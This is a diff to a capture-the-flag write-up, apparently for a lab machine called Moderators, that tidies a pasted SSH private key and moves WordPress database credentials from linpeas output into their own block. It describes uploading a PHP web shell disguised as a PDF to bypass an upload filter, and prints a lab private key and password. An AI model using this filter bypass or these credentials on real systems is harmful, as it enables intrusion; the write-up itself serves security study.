@@ -131,6 +131,7 @@ So Wget one of the logs.pdf files and upload it from the page.
 Then capture in burpsuite and edit out the pdf content with our own payload.
 
 Note: Be sure to change the pdf file type to something like shell.pdf.php and to leave the %PDF-1.5 to bypass the filter.
+
 Note2: Also be sure to rename the file if you fail since the files do not get overwritten or deleted.
 
 
@@ -266,14 +267,7 @@ cat user.txt
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357Lf╔══════════╣ Analyzing Wordpress Files (limit 70)
--rwxr----- 1 lexi moderators 3118 Sep 11  2021 /opt/site.new/wp-config.php                                                     
-define( 'DB_NAME', 'wordpress' );
-define( 'DB_USER', 'wordpressuser' );
-define( 'DB_PASSWORD', 'wordpresspassword123!!' );
-define( 'DB_HOST', 'localhost' );
-
-XjhIuTG4qkX6eY4iCw7EBGKwaEryn
+NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn
 ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM
 ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ/QRXYrblAj8Bo1owGebWUBlB/tMcO3Yqvaa
 QCuzVluSShMrGKJVjL0n2Uvqf/Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV
@@ -310,6 +304,15 @@ xA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJly
 J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA==
 -----END OPENSSH PRIVATE KEY-----
 ```
+```console
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rwxr----- 1 lexi moderators 3118 Sep 11  2021 /opt/site.new/wp-config.php                                                     
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpressuser' );
+define( 'DB_PASSWORD', 'wordpresspassword123!!' );
+define( 'DB_HOST', 'localhost' );
+```
+
 # John Privilege Escalation
 
 ```console
